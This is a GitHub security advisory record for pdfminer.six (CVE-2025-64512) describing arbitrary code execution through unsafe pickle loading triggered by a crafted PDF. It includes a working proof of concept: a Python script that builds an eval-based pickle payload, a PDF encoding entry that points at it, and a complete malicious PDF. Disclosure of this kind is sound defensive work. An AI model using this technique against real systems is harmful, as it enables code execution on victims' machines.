{
  "Severity": "HIGH",
  "UpdatedAt": "2025-11-07T20:52:25Z",
  "Package": {
    "Ecosystem": "PIP",
    "Name": "pdfminer.six"
  },
  "Advisory": {
    "DatabaseId": 320807,
    "Id": "GSA_kwCzR0hTQS13ZjVmLTRqd3ItcHBjcM4ABOUn",
    "GhsaId": "GHSA-wf5f-4jwr-ppcp",
    "References": [
      {
        "Url": "https://github.com/pdfminer/pdfminer.six/security/advisories/GHSA-wf5f-4jwr-ppcp"
      },
      {
        "Url": "https://github.com/pdfminer/pdfminer.six/commit/b808ee05dd7f0c8ea8ec34bdf394d40e63501086"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64512"
      },
      {
        "Url": "https://github.com/pdfminer/pdfminer.six/releases/tag/20251107"
      },
      {
        "Url": "https://github.com/advisories/GHSA-wf5f-4jwr-ppcp"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-wf5f-4jwr-ppcp"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-64512"
      }
    ],
    "Description": "### Summary\n\npdfminer.six will execute arbitrary code from a malicious pickle file if provided with a malicious PDF file. The `CMapDB._load_data()` function in pdfminer.six uses `pickle.loads()` to deserialize pickle files. These pickle files are supposed to be part of the pdfminer.six distribution stored in the `cmap/` directory, but a malicious PDF can specify an alternative directory and filename as long as the filename ends in `.pickle.gz`. A malicious, zipped pickle file can then contain code which will automatically execute when the PDF is processed.\n\n### Details\n\n```python\n# Vulnerable code in pdfminer/cmapdb.py:233-246\ndef _load_data(cls, name: str) -\u003e Any:\n    name = name.replace(\"\\0\", \"\")  # Insufficient sanitization\n    filename = \"%s.pickle.gz\" % name\n    # ... path construction ...\n    path = os.path.join(directory, filename) # If filename is an absolte path, directory is ignored\n    # ...\n    return type(str(name), (), pickle.loads(gzfile.read()))  # Unsafe deserialization\n```\n\nAn attacker can:\n1. Create a malicious PDF with a CMap reference like `/malicious`\n2. Place a malicious pickle file at `/malicious.pickle.gz`\n3. When the PDF is processed, pdfminer loads and deserializes the malicious pickle\n4. The pickle deserialization can execute arbitrary Python code\n\n### POC\n\n#### Malicious PDF\n\nCreate a PDF with a malicious CMAP entry:\n\n```\n5 0 obj\n\u003c\u003c\n/Type /Font\n/Subtype /Type0\n/BaseFont /MaliciousFont-Identity-H\n/Encoding /#2Fpdfs#2Fmalicious\n/DescendantFonts [6 0 R]\n\u003e\u003e\nendobj\n```\n\nHere the /Encoding points to `/pdfs/malicious`. Pdfminer will append the extension `.pickle.gz` to this filename. Place the PDF in a file called `/pdfs/malicious.pdf`.\n\n#### Malicious Pickle\n\nCreate a malicious, zipped pickle to execute. For example, with this Python script:\n\n```python\n#!/usr/bin/env python3\nimport pickle\nimport gzip\n\ndef create_demo_pickle():\n    print(\"Creating demonstration pickle file...\")\n\n    # Create payload that executes code AND returns a dict (as pdfminer expects)\n    class EvilPayload:\n        def __reduce__(self):\n            # This function will be called during unpickling\n            code = \"print('Malicious code executed.') or exit(0) or {}\"\n            return (eval, (code,))\n\n    demo_cmap_data = EvilPayload()\n\n    # Create the pickle file that the path traversal would access\n    target_path = \"./malicious.pickle.gz\"\n\n    try:\n        with gzip.open(target_path, 'wb') as f:\n            pickle.dump(demo_cmap_data, f)\n        print(f\"✓ Created demonstration pickle file: {target_path}\")\n        return target_path\n\n    except Exception as e:\n        print(f\"✗ Error creating pickle file: {e}\")\n        return None\n\nif __name__ == \"__main__\":\n    create_demo_pickle()\n```\n\nThis will create a harmless, zipped pickle file that will display \"Malicious code eecuted.\" then exit when deserialized. Put the file in `/pdfs/malicious.pickle.gz`.\n\n#### Test\n\nInstall pdfminer.six and run `pdf2text.py /pdfs/malicious.pdf`. Instead of processing the PDF as normal you should see the output:\n\n```\n$ pdf2txt.py malicious.pdf\nMalicious code executed!\n```\n\n### Impact\n\nIf pdfminer.six processes a malicious PDF which points to a zipped pickle file under the control of an attacker the result is arbitrary code execution on the victim's system. An attacker could execute the Python code of their chosing with the permissions of the process running pdfminer.six.\n\nThe difficulty in achieving this depends on the OS, see below.\n\n#### Linux, MacOS - harder to exploit\n\nOn Linux-like systems only files on the filesystem can be resolved. An attacker would need to provide the malicious PDF for processing *and* the malicious pickle file would need to be present on the target system in a location that the attacker already knows, since it needs to be set in the PDF itself. In many cases this will be difficult to exploit because even if the attacker provides both the PDF and the pickle file together, there would be no way to know in advance which full path to the pickle file to specify. In many cases this would make exploitation difficult or impossible. However:\n\n* An attacker may find a way to write files to a known location on the target system or\n* The system in question may, by design, read files from a known location such as a network share designated for PDF ingestion.\n\nOverall, there is generally less risk on a Linux or Linux-like system.\n\n#### Windows - easier to exploit\n\nWindows paths can specify network locations e.g. WebDAV, SMB. This means that an attacker could host the malicious pickle remotely and specify a path to the it in the PDF. Since there is no need to get the malicious pickle file on to the target system, exploitation is easier on a Windows OS.\n\n### Appendix\n\nA complete, malicious PDF is provided here. A dockerized POC is available upon request.\n\n```\n%PDF-1.4\n1 0 obj\n\u003c\u003c\n/Type /Catalog\n/Pages 2 0 R\n\u003e\u003e\nendobj\n\n2 0 obj\n\u003c\u003c\n/Type /Pages\n/Kids [3 0 R]\n/Count 1\n\u003e\u003e\nendobj\n\n3 0 obj\n\u003c\u003c\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n/Contents 4 0 R\n/Resources\n\u003c\u003c\n/Font\n\u003c\u003c\n/F1 5 0 R\n\u003e\u003e\n\u003e\u003e\n\u003e\u003e\nendobj\n\n4 0 obj\n\u003c\u003c\n/Length 44\n\u003e\u003e\nstream\nBT\n/F1 12 Tf\n100 700 Td\n(Malicious PDF) Tj\nET\nendstream\nendobj\n\n5 0 obj\n\u003c\u003c\n/Type /Font\n/Subtype /Type0\n/BaseFont /MaliciousFont-Identity-H\n/Encoding /#2Fpdfs#2Fmalicious\n/DescendantFonts [6 0 R]\n\u003e\u003e\nendobj\n\n6 0 obj\n\u003c\u003c\n/Type /Font\n/Subtype /CIDFontType2\n/BaseFont /MaliciousFont\n/CIDSystemInfo\n\u003c\u003c\n/Registry (Adobe)\n/Ordering (Identity)\n/Supplement 0\n\u003e\u003e\n/FontDescriptor 7 0 R\n\u003e\u003e\nendobj\n\n7 0 obj\n\u003c\u003c\n/Type /FontDescriptor\n/FontName /MaliciousFont\n/Flags 4\n/FontBBox [-1000 -1000 1000 1000]\n/ItalicAngle 0\n/Ascent 1000\n/Descent -200\n/CapHeight 800\n/StemV 80\n\u003e\u003e\nendobj\n\nxref\n0 8\n0000000000 65535 f\n0000000009 00000 n\n0000000058 00000 n\n0000000115 00000 n\n0000000274 00000 n\n0000000370 00000 n\n0000000503 00000 n\n0000000673 00000 n\ntrailer\n\u003c\u003c\n/Size 8\n/Root 1 0 R\n\u003e\u003e\nstartxref\n871\n%%EOF\n```",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-11-07T20:52:24Z",
    "Severity": "HIGH",
    "Summary": "Arbitrary Code Execution in pdfminer.six via Crafted PDF Input",
    "UpdatedAt": "2025-11-15T02:12:21Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 8.6,
      "VectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "20251107"
      },
      "VulnerableVersionRange": "\u003c 20251107"
    }
  ]
}